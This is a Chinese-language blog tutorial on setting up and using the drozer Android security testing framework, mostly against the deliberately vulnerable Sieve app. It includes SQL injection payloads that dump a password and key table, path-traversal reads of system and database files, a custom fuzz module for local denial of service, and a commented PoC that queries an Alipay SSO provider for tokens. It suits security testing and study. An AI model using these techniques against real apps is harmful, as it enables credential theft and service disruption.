---
title: android-drozer
tags:
  - android安全测试
  - drozer
  - android安全
  - android本地拒绝服务
categories:
  - - 安全
    - 移动安全
    - android安全
    - drozer
description: drozer配置&使用
abbrlink: 525637870
date: 2020-11-01 09:13:02
top: 10
---

# android_drozer

https://github.com/FSecureLABS/drozer
[参考文档](https://www.mwrinfosecurity.com/system/assets/559/original/mwri_drozer-users-guide_2013-09-11.pdf )
[文档](https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf)  

## 前置条件
mumu模拟器或root过的手机  
adb    
python2.7  
jdk  

我的环境
```
~ » python -V                                              tea@teadeMacBook-Pro
Python 2.7.13
--------------------------------------------------------------------------------
~ » java -version                                          tea@teadeMacBook-Pro
java version "1.7.0_80"
Java(TM) SE Runtime Environment (build 1.7.0_80-b15)
Java HotSpot(TM) 64-Bit Server VM (build 24.80-b11, mixed mode)
```

## 安装
**docker**
https://hub.docker.com/r/kengannonmwr/drozer_docker
没有试过可以安装试试看

**win：**  
https://github.com/FSecureLABS/drozer/releases
安装drozer-2.4.4.win32.msi

**mac：**  
安装python2
pyenv install 2.7.17
pyenv local 2.7.17

-安装drozer
下载
https://github.com/FSecureLABS/drozer/releases
drozer-2.4.4-py2-none-any.whl
sudo pip install drozer-2.4.4-py2-none-any.whl

-安装 drozer-agent-2.3.4.apk
https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk

打开Embedded Server  
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/38/1.png)


-转发
mumu模拟器链接不上了  
[adb如何连接mumu模拟器](http://mumu.163.com/2017/12/19/25241_730476.html)  
adb kill-server && adb server && adb shell

adb forward tcp:31415 tcp:31415 

-进入drozer控制台
drozer console connect

```
~/Downloads » drozer console connect                       tea@teadeMacBook-Pro
/Users/tea/.pyenv/versions/2.7.17/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
:0: UserWarning: You do not have a working installation of the service_identity module: 'No module named service_identity'.  Please install it from <https://pypi.python.org/pypi/service_identity> and make sure all of its dependencies are satisfied.  Without the service_identity module, Twisted can perform only rudimentary TLS client hostname verification.  Many valid certificate/hostname mappings may be rejected.
Selecting b58079c46c8716e4 (Netease MuMu 6.0.1)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz> 
``` 

## 使用
安装待测试app  
https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk

列出所有app
run app.package.list
```
dz> run app.package.list
com.android.providers.telephony (移动网络配置)
com.android.providers.calendar (日历存储)
com.netease.nemu_vinput.nemu (nemu-vinput)
com.android.providers.media (媒体存储)
com.android.wallpapercropper (com.android.wallpapercropper)
com.android.documentsui (文档)
com.android.galaxy4 (Black Hole)
com.android.externalstorage (外部存储设备)
com.android.htmlviewer (HTML 查看程序)
com.android.quicksearchbox (搜索)
com.android.mms.service (MmsService)
com.android.providers.downloads (下载管理程序)
com.android.browser (浏览器)
com.android.defcontainer (软件包权限帮助程序)
```

获取设备上的app的包名 -f根据app关键字参数查找
run app.package.list -f sieve
```
dz> run app.package.list -f sieve
com.mwr.example.sieve (Sieve)
```
获取Sieve的一些基本信息
run app.package.info -a com.mwr.example.sieve
```
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  Application Label: Sieve
  Process Name: com.mwr.example.sieve
  Version: 1.0
  Data Directory: /data/user/0/com.mwr.example.sieve
  APK Path: /data/app/com.mwr.example.sieve-1/base.apk
  UID: 10038
  GID: [3003]
  Shared Libraries: null
  Shared User ID: null
  Uses Permissions:
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.INTERNET
  Defines Permissions:
  - com.mwr.example.sieve.READ_KEYS
  - com.mwr.example.sieve.WRITE_KEYS

dz>
```
确定攻击面
run app.package.attacksurface com.mwr.example.sieve
```
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable
```
获取activity信息
```
run app.activity.info -a com.mwr.example.sieve

dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList
    Permission: null
```
启动activity
```
run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity
run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

枚举provider
run app.provider.info -a com.mwr.example.sieve
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.DBContentProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
    Path Permissions:
      Path: /Keys
        Type: PATTERN_LITERAL
        Read Permission: com.mwr.example.sieve.READ_KEYS
        Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.FileBackupProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
```
扫描可用的uri
run app.provider.finduri com.mwr.example.sieve
```
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys
```

先运行sieve添加密码后才有数据  
查找可以访问Content Provider的URI（数据泄漏）
run scanner.provider.finduris -a com.mwr.example.sieve
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/
Unable to Query  content://com.mwr.example.sieve.DBContentProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/
Unable to Query  content://com.mwr.example.sieve.FileBackupProvider
Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords
Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys

Accessible content URIs:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
dz> 
```



检查是否有sql注入
run scanner.provider.injection -a com.mwr.example.sieve
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.DBContentProvider
  content://com.mwr.example.sieve.FileBackupProvider

Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/

Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
dz>
```
通过暴露的数据接口插入数据
```
dz> run app.provider.insert content://com.mx.browser.browserprovider/bookmark/ -<br>
-integer _id 6 --string title Taobao --string url http://**.**.**.**/ --integ<br>
er parent 0
```


执行SQL注入，Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。如：  

run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```
上面两条命令执行后Android设备返回了非常详细的错误信息。使用Sql注入列出数据库中的所有数据表：
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql                                                                                              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )                                           |


```
使用SQL注入列出数据表的内容：
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;—"
| Password         | pin  |
| qwertyuiopasdfgh | 1234 |
```

查看 URI 的数据信息
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
     _id  1
 service  1
username  1
password  6yBrYE5xVz93mi7Ve9KKKBGjYMGt8uY= (Base64-encoded)
   email  1


```
查看数据库所有表信息
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql                                                                                              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )                                           |


```

查看单张数据表数据
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
| Password         | pin  |
| qwertyuiopasdfgh | 1234 |


```


检查是否存在遍历文件的漏洞
run scanner.provider.traversal -a com.mwr.example.sieve
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.FileBackupProvider
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider

Vulnerable Providers:
  No vulnerable providers found.
dz> 
```
手动测试目录遍历漏洞：
读取指定路径文件内容：
run app.provider.read contentProviderURI+filePath


run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts

下载安装包目录下指定目录下的文件：run app.provider.download contentProviderURI+filePath exportPath

run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /Users/tea/Downloads/databse.db

run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db .


获取service信息
获取是exported状态的services的命令
run app.service.info -a com.mwr.example.sieve
```
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```
向服务发送消息
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 1 5 3

run app.service.send com.example.srv com.example.srv.Service --msg 1 2 3 --extra float value 0.1324 --extra string test value


关于service模块
```
dz> cd app
dz#app> cd service
dz#app.service> ls
app.service.info   Get information about exported services                      
app.service.send   Send a Message to a service, and display the reply           
app.service.start  Start Service                                                
app.service.stop   Stop Service  
```

## 使用

```
dz> run app.package.list #设备中已安装的包
dz> run app.package.list -f sieve #关键字查找包名
com.mwr.example.sieve (Sieve)

dz> run app.package.info --help 

dz> run app.package.info --package [包名]

dz> run app.package.info -a com.mwr.example.sieve #查看包信息
Package: com.mwr.example.sieve
  Application Label: Sieve
  Process Name: com.mwr.example.sieve
  Version: 1.0
  Data Directory: /data/user/0/com.mwr.example.sieve
  APK Path: /data/app/com.mwr.example.sieve-1/base.apk
  UID: 10152
  GID: [3003]
  Shared Libraries: null
  Shared User ID: null
  Uses Permissions:
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.INTERNET
  Defines Permissions:
  - com.mwr.example.sieve.READ_KEYS
  - com.mwr.example.sieve.WRITE_KEYS
  
Application Label 显示app的名称
Process Name 显示运行该app的进程名称
Version 所安装的app的版本
Data Directory 用来存储用户数据以及明确与该app关联的应用程序目录完整路径
APK Path 设备中app真正的package文件所在的路径
UID 与该app关联的用户ID 
GID 与该app的用户ID相关联的系统group id
Shared Libraries 该app使用的共享库的完整路径
Shared User ID 可以使用该app的共享用户的ID
Use Permissions app的权限列表

# 根据包的权限寻找包
dz> run app.package.info -p [权限标识]
dz> run app.package.info -p android.permission.INTERNET

# 列出导出的activity
dz> run app.activity.info

# 根据名称搜索activity
dz> run app.activity.info --filter [activity名]
dz> run app.activity.info --filter facebook
dz> run app.activity.info --f facebook

# 搜索指定包中的activity
dz> run app.activity.info --package [package名]
dz> run app.activity.info -a [package名]
dz> run app.activity.info -a com.android.phone

# 枚举content provider
dz> run app.provider.info
dz> run app.provider.info -a [包名] #包名称进行搜索
dz> run app.provider.info -p [权限标识] # 权限进行搜索

# 枚举service
dz> run app.service.info --package [包名]
dz> run app.service.info -p [权限标识]

# 根据service名进行搜索
dz> run app.service.info -f [过滤字符串]
dz> run app.service.info -filter [过滤字符串]

# 列出未导出的service
dz> run app.service.info -u
dz> run app.service.info --unexported
dz> run app.service.info --help

# 攻击点
run app.package.attacksurface xx.xx.xx

# 启动activity
run app.activity.start --component xx.xx.xx xx.xx.Activity

> list  //列出目前可用的模块，也可以使用ls
> help app.activity.forintent       //查看指定模块的帮助信息
> run app.package.list      //列出android设备中安装的app
> run app.package.info -a com.android.browser       //查看指定app的基本信息
> run app.activity.info -a com.android.browser      //列出app中的activity组件
> run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面
> run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Provider
> run  app.provider.query content://settings/secure --selection "name='adb_enabled'"    //读取指定Content Provider内容
> run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件
> run shell.start       //shell操作
> run tools.setup.busybox       //安装busybox
> list auxiliary        //通过web的方式查看content provider组件的相关内容
> help auxiliary.webcontentresolver     //webcontentresolver帮助
> run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问
以sieve示例
> run app.package.list -f sieve         //查找sieve应用程序
> run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息
> run app.package.attacksurface com.mwr.example.sieve   //确定攻击面
> run app.activity.info -a com.mwr.example.sieve         //获取activity信息
> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist
> run app.provider.info -a com.mwr.example.sieve        //提供商信息
> run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 
>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址
> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"   //检测注入
> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据
> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据
> run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址
> run scanner.provider.traversal -a com.mwr.example.sieve
> run app.service.info -a com.mwr.example.sieve         //查看服务
```
显式 intent开启浏览器:  
```
run app.activity.start --component com.android.browser   com.android.browser.BrowserActivity --flags ACTIVITY_NEW_TASK
```

隐式 intent开启浏览器
```
run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --flags ACTIVITY_NEW_TASK
```
更多命令查看：
[Drozer模块命令大全（一）](https://blog.csdn.net/cch139745/article/details/53519900)  
[Drozer模块命令大全（二）](https://blog.csdn.net/cch139745/article/details/53691123)  

## 正式利用

**对activity进行fuzz自动化测试本地拒绝服务**  
模块代码
fuzz.py
```
from drozer import android
from drozer.modules import common, Module

class Deny(Module, common.Filters, common.PackageManager):

    name = "find NullPointerException"
    description = "."
    examples = """
    dz> run app.package.deny com.android.browser
    6 activities exported
    4 broadcast receivers exported
    1 content providers exported
    0 services exported"""
    author = "ydalien"
    date = "2017-01-02"
    license = "BSD (3 clause)"
    path = ["exp", "fuzz"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def add_arguments(self, parser):
        parser.add_argument("package", help="the identifier of the package to inspect")

    def attack(self,component,package,flags):
        act=None
        cat=None
        data=None
        comp=(package,component.name)
        extr=None
        flgs=None

        if(flags=='activity'):
            flgs =['ACTIVITY_NEW_TASK']

        intent = android.Intent(action=act,component=comp,category=cat,data_uri=None, extras=extr, flags=flgs, mimetype=None)

        if intent.isValid():
            if(flags=='activity'):
                self.getContext().startActivity(intent.buildIn(self))
            if(flags=='service'):
                self.getContext().startService(intent.buildIn(self))
            if(flags == 'receiver'):
                self.getContext().sendBroadcast(intent.buildIn(self))
        else:
            self.stderr.write("[-] Invalid Intent!n")


    def execute(self, arguments):
        if arguments.package != None:
            package = self.packageManager().getPackageInfo(arguments.package, common.PackageManager.GET_ACTIVITIES | common.PackageManager.GET_RECEIVERS | common.PackageManager.GET_PROVIDERS | common.PackageManager.GET_SERVICES)
            application = package.applicationInfo

            activities = self.match_filter(package.activities, 'exported', True)
            receivers = self.match_filter(package.receivers, 'exported', True)
            providers = self.match_filter(package.providers, 'exported', True)
            services = self.match_filter(package.services, 'exported', True)

            self.stdout.write("Attack Surface:n")
            self.stdout.write("  %d activities exportedn" % len(activities))
            self.stdout.write("  %d broadcast receivers exportedn" % len(receivers))
            self.stdout.write("  %d content providers exportedn" % len(providers))
            self.stdout.write("  %d services exportedn" % len(services))

            if (application.flags & application.FLAG_DEBUGGABLE) != 0:
                self.stdout.write("    is debuggablen")

            if package.sharedUserId != None:
                self.stdout.write("    Shared UID (%s)n" % package.sharedUserId)

            actions=[activities,receivers,services]
            action_str=['activity','receiver','service']
            i=-1
            try:
                for action in actions:
                    i+=1
                    if len(action) > 0:
                        for tmp in action:
                            try:
                                if len(tmp.name) > 0:
                                    self.stdout.write(" [+]%s name:%sn" % (action_str[i],tmp.name))
                                    self.attack(component=tmp, package=arguments.package, flags=action_str[i])
                            except Exception, e:
                                self.stdout.write(" error-->%s name:%sn" % (action_str,tmp.name))
                                self.stdout.write(" errorcontent:%sn" % e)
                                continue
            except:
                self.stdout.write(" error")
        else:
            self.stdout.write("No package specifiedn")
```

创建自己的moudle仓库
module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea
安装模块
module install /Users/tea/Documents/tools/android/drozer-modules-bytea/fuzz.py

运行fuzz
run exp.fuzz.deny com.mwr.example.sieve

新开个命令行监听运行异常日志
adb logcat | grep java.lang.RuntimeException 


手工启动actvity
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/38/2.png)
```
drozer:
run app.activity.start --component com.xx.xx com.xx.xx.XXEntryActivity

adb shell:
adb shell am start -n com.xx.xx/com.xx.xx.XXEntryActivity 
```
![](https://raw.githubusercontent.com/tea9/image/master/blog_img/38/3.jpg)

poc:

```
public class MainActivity extends Activity {

    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button button =(Button) findViewById(R.id.button);
    button.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            /*
            Uri uri=Uri.parse("content://com.alipay.ali.authlogin/aliuser_sdk_sso");
            Cursor cursor=getContentResolver().query(uri, null, null, null, null);
            if(cursor!=null){
                String id=cursor.getString(cursor.getColumnIndex("loginId"));
                String img=cursor.getString(cursor.getColumnIndex("headImg"));
                String token=cursor.getString(cursor.getColumnIndex("alipaySsoToken"));
                System.out.println(id);
                //Toast.makeText(context, id+""+img+""+token, Toast.LENGTH_SHORT);    
            }

            cursor.close();
            */
            //Intent v2=new Intent("com.xx.idlefish.DATA_EXPORT");
            Intent v2=new Intent();
            v2.setClassName("xx.xx.xx", "xx.xx.xx.xxx.xxx.xxx");
            //v2.setClassName("tv.xx.bili", "com.mall.ui.base.MallSigalTaskWebFragmentLoadActivity");
            //v2.addCategory("android.intent.category.BROWSABLE");
            //v2.putExtra("id", "a");
            //v2.putExtra("c", "exportData");

            //v2.putExtra("_fragment", "com.mall.base.web.MallWebFragment");
            //v2.setData(Uri.parse("file:///storage/emulated/0/tencent/MicroMsg/Download/2.html"));
            //v2.putExtra("intent_bundle_nameintent_bundle_name","a");
            //v2.putExtra("bundle_select_limit_num",1);
            //v2.setData(Uri.parse(""));
            startActivity(v2);
            //startService(v2);
            //sendBroadcast(v2);
        }
    });    

    }
}
```
[android_app_src_poc](https://github.com/tea9/android_app_src_poc)  


## 安装模块
https://github.com/FSecureLABS/drozer-modules

下载的module
https://github.com/FSecureLABS/drozer-modules

创建自己的moudle仓库，导入刚刚下载的官方插件
新建文件夹
module repository create /XXX/Android/drozer-modules-master

安装模块：安装下载下来的drozer-modules里的模块
module install /XXXX/Android/drozer-modules-master/intents/fuzzinozer.py
```
dz> module repository create /Users/tea/Documents/tools/android/drozer-modules-bytea1
Initialised repository at /Users/tea/Documents/tools/android/drozer-modules-bytea1.

dz> module install /Users/tea/Documents/tools/android/drozer-modules/intents/fuzzinozer.py
You have 2 drozer Module Repositories. Which would you like to install into?

      1  /Users/tea/Documents/tools/android/drozer-modules-bytea
      2  /Users/tea/Documents/tools/android/drozer-modules-bytea1

repo> 1

Processing /Users/tea/Documents/tools/android/drozer-modules/intents/fuzzinozer.py... Already Installed.

Successfully installed 0 modules, 1 already installed.
```

运行刚刚安装的模块
run intents.fuzzinozer --fuzzing_intent --package_name com.mwr.example.sieve

run intents.fuzzinozer --help
run intents.fuzzinozer --package_name com.android.bluetoothmidiservice --dos_attack 35
Android Intent Fuzzing Module for Drozer

https://wooyun.js.org/drops/drozer%E6%A8%A1%E5%9D%97%E7%9A%84%E7%BC%96%E5%86%99%E5%8F%8A%E6%A8%A1%E5%9D%97%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6.html

开源库
https://github.com/kelvinBen/DrozerFuzz





## drozer-fuzz
[Android Intent Fuzzing Module for Drozer](https://events.ccc.de/congress/2015/wiki/images/8/8d/Ccc_pdf_fuzzinozer.pdf)   
[Binder Fuzz based on drozer](https://myslide.cn/slides/14248)  
[DrozerFuzz](https://github.com/kelvinBen/DrozerFuzz)  




## ERROR

1.Run 'pip install twisted' to fetch this dependency.  
```
 drozer console connect                       tea@teadeMacBook-Pro
/Users/tea/.pyenv/versions/2.7.17/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
drozer Server requires Twisted to run.
Run 'pip install twisted' to fetch this dependency.
```
安装
pip install twisted

---

2.drozer could not find or compile a required extension library.  
drozer console connect --debug
```
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
exception in module: RuntimeError: drozer could not find or compile a required extension library.

Traceback (most recent call last):
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/console/session.py", line 394, in do_run
    module.run(argv[1:])
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/base.py", line 183, in run
    result = self.execute(arguments)
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/app/provider.py", line 124, in execute
    uris = self.findAllContentUris(arguments.package)
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py", line 206, in findAllContentUris
    uris = uris.union(self.__search_package(package))
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py", line 316, in __search_package
    for (path, content_uris) in self.findContentUris(package.packageName):
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/provider.py", line 228, in findContentUris
    dex_file = self.extractFromZip("classes.dex", path, self.cacheDir())
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/zip_file.py", line 14, in extractFromZip
    ZipUtil = self.loadClass("common/ZipUtil.apk", "ZipUtil")
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/loader.py", line 30, in loadClass
    Module.cache_klass(".".join([source, klass]), loader.loadClass(klass))
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py", line 28, in loadClass
    return self.getClassLoader().loadClass(klass);
  File "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py", line 51, in getClassLoader
    raise RuntimeError("drozer could not find or compile a required extension library.\n")
RuntimeError: drozer could not find or compile a required extension library.
```
修改 /Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/pydiesel/reflection/utils/class_loader.py

```
 def __get_source(self, source_or_relative_path, relative_to=None):
        """
        Get source, either from an apk file or passed directly.
        """
        
        source = None

        if source_or_relative_path.endswith(".apk"):
           ...
            #apk_path = os.path.join(relative_to, *source_or_relative_path.split("/"))
            apk_path = "/Users/tea/.pyenv/versions/2.7.13/lib/python2.7/site-packages/drozer/modules/common/ZipUtil.apk"
            java_path = apk_path.replace(".apk", ".java")
            
        ....
        return source
```
https://github.com/FSecureLABS/drozer/issues/361




## LINKS
[Drozer - Android APP安全评估工具（附测试案例）](https://www.freebuf.com/sectool/26503.html)  
[Drozer 安装和使用 (Mac)](https://www.jianshu.com/p/168cdd3daa1d)   
[Drozer安装(Mac系统)和使用](https://www.jianshu.com/p/65fc2d52c7b1)  
[利用drozer进行Android渗透测试](https://www.cnblogs.com/goodhacker/p/3906180.html)  
[Drozer模块命令大全（一）](https://blog.csdn.net/cch139745/article/details/53519900)  
[Drozer模块命令大全（二）](https://blog.csdn.net/cch139745/article/details/53691123)  
[Android安全测试框架Drozer（使用篇）](https://www.jianshu.com/p/dfa92bab3a55)  
[利用drozer进行Android渗透测试](http://www.blogjava.net/qileilove/archive/2015/03/18/423597.html)  
[浅析src的app漏洞挖掘](https://www.anquanke.com/post/id/187948)  
[利用Drozer进行app本地拒绝服务漏洞测试](http://rui0.cn/archives/30)  
